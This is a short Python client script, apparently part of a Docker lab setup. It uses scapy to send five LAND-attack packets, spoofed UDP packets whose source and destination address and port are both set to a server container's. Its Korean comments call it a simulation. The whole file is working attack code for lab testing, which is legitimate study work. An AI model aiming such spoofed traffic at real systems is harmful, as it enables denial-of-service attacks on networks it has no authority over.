# client/client.py
from scapy.all import IP, UDP, send
import time

# --- 설정값 ---
# Docker Compose 네트워크에서 서버 컨테이너의 IP로 설정해야 함
# 일반적으로 도커 네트워크 상에서 IP는 172.x.x.x 대역을 사용함
# 실제 서버 컨테이너의 IP를 확인하여 대체해야함
# 여기서는 '172.20.0.2'를 사용했음
TARGET_SERVER_IP = "172.20.0.2" 
TARGET_PORT = 5000  # 서버가 수신 대기하는 포트 (임의로 지정함)


def send_land_packets(target_ip, target_port, count=5):
    """LAND 공격 패킷을 전송"""
    
    # 1. IP 헤더 위조: Source IP == Destination IP (서버 IP)
    ip_layer = IP(src=target_ip, dst=target_ip, ttl=64) 
    
    # 2. UDP 헤더 위조: Source Port == Destination Port (서버 포트)
    udp_layer = UDP(sport=target_port, dport=target_port)
    
    payload = f"LAND-TEST-{time.time()}"
    packet = ip_layer / udp_layer / payload
    
    print(f"[*] Starting LAND-like Attack simulation on {target_ip}:{target_port}")
    print(f"[*] Sending {count} packets (Src/Dst: {target_ip}:{target_port})")

    for i in range(count):
        # Raw Socket을 사용하여 패킷 전송
        send(packet, verbose=False)
        print(f"  - Sent packet {i+1}/{count}")
        time.sleep(0.5) # 너무 빠르게 보내지 않도록 지연

if __name__ == "__main__":
    send_land_packets(TARGET_SERVER_IP, TARGET_PORT, count=5)
